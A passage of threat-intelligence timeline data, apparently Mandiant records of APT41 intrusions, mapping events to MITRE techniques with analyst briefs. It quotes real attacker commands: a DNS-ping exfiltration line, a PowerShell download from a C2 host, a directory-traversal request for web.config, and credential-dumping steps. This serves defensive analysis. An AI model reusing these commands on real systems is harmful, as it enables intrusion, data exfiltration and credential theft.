'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-07T00:00:00.000Z', 'attributions': {'releasable': True, 'files': [{'type': 'md5', 'id': 'md5--abdeaeec-a222-5144-9f1e-6fc16e393c1d', 'attribution_scope': 'confirmed', 'releasable': True, 'value': '239dce68306c38d0e9a3a8d0f4048e79', 'associated_hashes': [{'type': 'md5', 'id': 'md5--abdeaeec-a222-5144-9f1e-6fc16e393c1d', 'releasable': True, 'value': '239dce68306c38d0e9a3a8d0f4048e79'}, {'type': 'sha256', 'id': 'sha256--5de53189-e94a-5e23-b6c6-fd40b34daed0', 'releasable': True, 'value': 'aaf88e26ebe3416e06fee935bcef4cd5cf66402e73e827a8415e67f2bdd2a450'}]}], 'malware': [{'type': 'malware', 'id': 'malware--4484e24c-fbf7-5894-90e2-4c6ed949ec6c', 'name': 'KEYPLUG', 'attribution_scope': 'confirmed', 'releasable': True}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-07-04T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--96b84c41-e4a2-5334-843c-690b2c067346', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': "ping -n 1 ((cmd /c dir c:\\\|findstr Number).split()[-1]+'.728c10b8.dns.1433.eu.org')"}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--c5ecdc1a-7976-5cb8-84a1-387fda9ac3c9', 'name': 'Use of ICMP', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b', 'name': 'Non-Application Layer Protocol', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1095', 'tactics': ['Command and Control']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Connectivity Check', 'analyst_brief': 'ICMP requests were sent to the remote subdomain of the free subdomain service EU.org in order to confirm connectivity.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-05T00:00:00.000Z', 'attributions': {'releasable': True, 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e10d971b-f104-52c0-82fe-36c2b88ed6e7', 'name': 'Webshell usage', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb', 'name': 'Server Software Component', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1505', 'tactics': ['Persistence']}, {'type': 'attack-pattern', 'id': 'attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb', 'name': 'Web Shell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1505.003', 'tactics': ['Persistence']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--9c7f710b-4596-57d9-b705-f7d30cb27299', 'name': 'Use of webshell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb', 'name': 'Server Software Component', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1505', 'tactics': ['Persistence']}, {'type': 'attack-pattern', 'id': 'attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb', 'name': 'Web Shell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1505.003', 'tactics': ['Persistence']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Webshell Interaction', 'analyst_brief': 'After dropping a simple JScript Eval webshell in the "wwwroot" directory, APT41 interacted with that webshell using HTTP GET requests.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2020-06-15T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--75829769-364f-5776-9a2d-0e8f8d7d4304', 'name': 'Web log entry \| GET /<REDACTED>.aspx path=<REDACTED>&file=../../../web.config 80 - "67.230.163.214" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 200 0 0 0', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--9f8eb3dc-1e05-542a-90e1-f0706fb07236', 'name': 'Viewing a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}, {'type': 'attack-pattern', 'id': 'attack-pattern--53eed210-aad4-5284-8687-d136f5c33002', 'name': 'Datamine network configuration or status', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0', 'name': 'System Network Configuration Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1016', 'tactics': ['Discovery']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Directory Traversal Vulnerability Exploited', 'analyst_brief': 'A directory traversal vulnerability was exploited that allowed the threat actor to navigate and traverse the file structure of the affected server in search of "web.config" files. These "web.config" files are IIS configuration files that may contain credentials or other information that a threat actor could exploit to gain further access on a system, as APT41 did in later intrusions.'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-23T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--85ba4551-80da-5c78-930e-450a3a9de6df', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': '.\\conhost.exe   a  -pSYSTEM -v500m -m9=LZMA2 .\\come.dat c:\\ProgramData\\*.txt'}], 'tools': [{'type': 'malware', 'id': 'malware--47530422-6b2d-5329-95c1-fcf7698edeee', 'name': '7ZIP', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--47f3990d-333d-5a1d-9362-e57f619c6223', 'name': 'File Masquerades', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0', 'name': 'Masquerading', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1036', 'tactics': ['Defense Evasion']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--8cfb0bea-cc62-5e0b-ba74-c6b312ec1749', 'name': 'Compressed with 7-Zip', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662', 'name': 'Archive via Utility', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1560.001', 'tactics': ['Collection']}, {'type': 'attack-pattern', 'id': 'attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a', 'name': 'Archive Collected Data', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1560', 'tactics': ['Collection']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Data Archival', 'analyst_brief': 'A renamed 7-Zip binary masquerading as the legitimate Windows file "conhost.exe" was used to archive host-based reconnaissance data that APT41 had saved to .txt files in C:\\ProgramData\\. All .txt files were compressed into the file "come.dat", saved to the current directory.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-05T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--7836a7da-1e4b-5ed0-a69e-823c523bce7a', 'name': 'FileItem:Created Accessed FilenameCreated FilenameModified FilenameAccessed FilenameChanged \| D:\\inetpub\\wwwroot\\<REDACTED>\\bin\\<REDACTED>.txt', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--46ed8959-571d-58c4-a934-891850964ba8', 'name': 'Remote Staging Directory', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e', 'name': 'Data Staged', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074', 'tactics': ['Collection']}, {'type': 'attack-pattern', 'id': 'attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0', 'name': 'Remote Data Staging', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074.002', 'tactics': ['Collection']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--1a0c3769-c5c9-5d94-8273-f638c4ed72ec', 'name': 'Exfiltration over web service', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807', 'name': 'Exfiltration Over Web Service', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1567', 'tactics': ['Exfiltration']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Staged Reconnaissance Data', 'analyst_brief': "A text file containing Active Directory reconnaissance data was staged within the server's web directory. The file was named after the local AD environment."},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-05T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--b808b322-b2fb-5ba5-926c-45f0a4f3f4eb', 'name': 'FileItem:Created Modified Accessed Changed FilenameCreated FilenameModified FilenameAccessed FilenameChanged \| C:\\Users\\Public\\sam.hiv', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--aaa71b54-2de3-56f8-a4b9-49619aaa6686', 'name': 'Local Staging Directory', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e', 'name': 'Data Staged', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074', 'tactics': ['Collection']}, {'type': 'attack-pattern', 'id': 'attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c', 'name': 'Local Data Staging', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074.001', 'tactics': ['Collection']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--75ba9f27-fff1-57ed-83d2-f80d4c9827fb', 'name': 'Datamine Windows registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896', 'name': 'Query Registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1012', 'tactics': ['Discovery']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--5bbdf932-85bc-5c16-a073-d47a740a96b7', 'name': 'Datamine credentials stored by Windows registry.', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517', 'name': 'Unsecured Credentials', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1552', 'tactics': ['Credential Access']}, {'type': 'attack-pattern', 'id': 'attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580', 'name': 'Credentials in Registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1552.002', 'tactics': ['Credential Access']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--78fc9e88-2580-5808-83af-e81b24db98bb', 'name': 'Credential theft from Security Accounts Manager (SAM) database', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011', 'name': 'Security Account Manager', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1003.002', 'tactics': ['Credential Access']}, {'type': 'attack-pattern', 'id': 'attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22', 'name': 'OS Credential Dumping', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1003', 'tactics': ['Credential Access']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Credential Harvesting', 'analyst_brief': 'The SAM Registry Hive was dumped and saved to disk.'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-10-17T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--93cf36ed-b856-5214-9975-36834a42963a', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': 'C:\\\\windows\\\\system32\\\\cmd.exe /c ""C:\\\\Windows\\\\Temp\\\\7zSB1E2.tmp\\\\a.bat" "'}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--78b289c3-f158-5d72-8dd5-55197fb784b2', 'name': 'Arbitrary payload execution using cmd.exe', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62', 'name': 'Windows Command Shell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059.003', 'tactics': ['Execution']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Payload Launched', 'analyst_brief': 'A suspicious batch script was launched via built-in "cmd.exe". Mandiant was unable to recover this file for analysis.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-06-14T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--dce69fc7-c0b6-5efe-83c9-7855f38cd633', 'name': 'Full Path: C:\\ProgramData\\dsquery.exe', 'attribution_scope': 'confirmed', 'releasable': True}], 'tools': [{'type': 'malware', 'id': 'malware--fed3481f-0095-53f2-8c32-7e286013233b', 'name': 'DSQUERY', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}, {'type': 'attack-pattern', 'id': 'attack-pattern--42d4b769-2156-5559-8b39-a0805b15c404', 'name': 'Datamine Active Directory data', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'DSQUERY Payload Dropped', 'analyst_brief': 'APT41 dropped a DSQUERY payload, a utility that they used to query Active Directory'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-12-05T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--6c89ef0e-f166-5b10-9a5c-07c2458490e8', 'name': 'GET /usaherds/Logon.aspx - 443 - <REDACTED> Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:94.0)+Gecko/20100101+Firefox/94.0 - 200 0 0 3 8.46.116.152', 'attribution_scope': 'confirmed', 'releasable': True}], 'vulnerabilities': [{'type': 'vulnerability', 'id': 'vulnerability--362764b4-aa15-55fd-a68b-caf84f25a6b0', 'attribution_scope': 'confirmed', 'releasable': True, 'cve_id': 'CVE-2021-44207'}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--8154ff97-5013-5fbe-815f-2b4ae13c734a', 'name': 'Malicious use of HTTP', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161', 'name': 'Web Protocols', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071.001', 'tactics': ['Command and Control']}, {'type': 'attack-pattern', 'id': 'attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6', 'name': 'Application Layer Protocol', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071', 'tactics': ['Command and Control']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'USAHerds .NET Web Application Exploited', 'analyst_brief': 'Following their eradication once again from a targeted environment in October 2021, APT41 re-exploited the USAHERDS CVE-2021-44207 that remained present on targeted servers.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-06-14T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--02fc3fb7-505e-5272-8243-ceb0dcb96cef', 'name': 'Full Path: C:\\ProgramData\\1.txt', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--97660fac-6d79-5269-a483-865d64b17dc3', 'name': 'Lateral Movement', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}, {'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Reconnaissance Data Output', 'analyst_brief': 'APT41 created a file with reconnaissance data'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2022-02-26T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--ad1ffddc-20cf-5350-a116-2a597adab54e', 'name': 'Full Path: C:\\ProgramData\\sylink.xml', 'attribution_scope': 'confirmed', 'releasable': True}], 'malware': [{'type': 'malware', 'id': 'malware--81b043a3-44c5-526a-af8c-b2730ba3bfbb', 'name': 'DEADEYE.APPEND', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'DEADEYE Payload Dropped', 'analyst_brief': "This DEADEYE payload is prevented from executing unless it is launched within the target client's environment."},<br/>{'name': 'Malicious Executable', 'description': 'Malicious Executable Compiled', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-04-02T00:00:00.000Z', 'attributions': {'releasable': True, 'malware': [{'type': 'malware', 'id': 'malware--4484e24c-fbf7-5894-90e2-4c6ed949ec6c', 'name': 'KEYPLUG', 'attribution_scope': 'confirmed', 'releasable': True}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-05T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--22ac1d0e-a97a-5da5-af29-2fd74d663de1', 'name': 'Full Path: D:\\inetpub\\wwwroot\\<REDACTED>\\bin\\utemp.exe', 'attribution_scope': 'confirmed', 'releasable': True}], 'tools': [{'type': 'malware', 'id': 'malware--bf2fc1e5-7850-5ecd-87a7-263e6da5708d', 'name': 'MIMIKATZ', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--46ed8959-571d-58c4-a934-891850964ba8', 'name': 'Remote Staging Directory', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e', 'name': 'Data Staged', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074', 'tactics': ['Collection']}, {'type': 'attack-pattern', 'id': 'attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0', 'name': 'Remote Data Staging', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074.002', 'tactics': ['Collection']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'MIMIKATZ Launched', 'analyst_brief': "A MIMIKATZ payload was dropped into a subdirectory of the server's web directory and launched for credential harvesting."},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-06-14T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--de20d588-d65f-5261-b736-f28688f1578c', 'name': 'Full Path: C:\\ProgramData\\group.txt', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Reconnaissance Data Output', 'analyst_brief': 'APT41 created a file with reconnaissance data'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2022-02-26T00:00:00.000Z', 'attributions': {'releasable': True, 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--703b08e4-735b-5c95-9ea9-6568a1589a59', 'name': 'Exploit Operations', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c', 'name': 'Exploit Public-Facing Application', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1190', 'tactics': ['Initial Access']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': '.NET Web Application Exploited', 'analyst_brief': 'APT41 returned to a target environment through the exploitation of a previously-targeted web application from July 2021.'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-23T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--63afa365-4a28-5b18-9df9-495eb362d98b', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': "powershell (new-object System.Net.WebClient).DownloadFile('http://<REDACTED>/x64.dll','c:\\users\\<REDACTED>\\x64.dll');"}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--77637ab2-8d9f-5791-8c62-e23d6e6b4acf', 'name': 'Download using PowerShell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add', 'name': 'Ingress Tool Transfer', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1105', 'tactics': ['Command and Control']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--57c9f36f-0348-510b-bed6-8564918c43f9', 'name': 'Use of PowerShell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736', 'name': 'PowerShell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059.001', 'tactics': ['Execution']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'PowerShell Download', 'analyst_brief': 'PowerShell was used to download a payload staged on a remote C2 server. Mandiant was unable to determine the final intended payload.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-10-17T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--a9d4f3de-df0d-58de-98cb-abc30bb2d80a', 'name': 'Full Path: C:\\ProgramData\\b.exe', 'attribution_scope': 'confirmed', 'releasable': True}], 'malware': [{'type': 'malware', 'id': 'malware--8e99e597-dda4-57dc-be6e-f1bc8b80a5f3', 'name': 'BADPOTATO', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--ae0d50d8-79de-5193-9223-178fde2c0756', 'name': 'Privilege escalation via access token impersonation', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d', 'name': 'Token Impersonation/Theft', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1134.001', 'tactics': ['Privilege Escalation', 'Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48', 'name': 'Access Token Manipulation', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1134', 'tactics': ['Privilege Escalation', 'Defense Evasion']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--07cf4702-f617-5e55-a0b5-6b7a3d808eb3', 'name': 'Arbitrary payload execution using msiexec', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--457c7820-d331-465a-915e-42f85500ccc4', 'name': 'System Binary Proxy Execution', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336', 'name': 'Msiexec', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218.007', 'tactics': ['Defense Evasion']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'BADPOTATO Dropped', 'analyst_brief': 'BADPOTATO sample created on exploited server. BADPOTATO is a publicly-available privilege escalation tool and is an evolution of similar tools, such as "JuicyPotato" or "RottenPotato", all of which are publicly available on Github.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-06-14T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--887a2cd3-ea5b-5f69-a312-70613b76063c', 'name': 'Full Path: C:\\ProgramData\\dsquery.dll', 'attribution_scope': 'confirmed', 'releasable': True}], 'tools': [{'type': 'malware', 'id': 'malware--fed3481f-0095-53f2-8c32-7e286013233b', 'name': 'DSQUERY', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 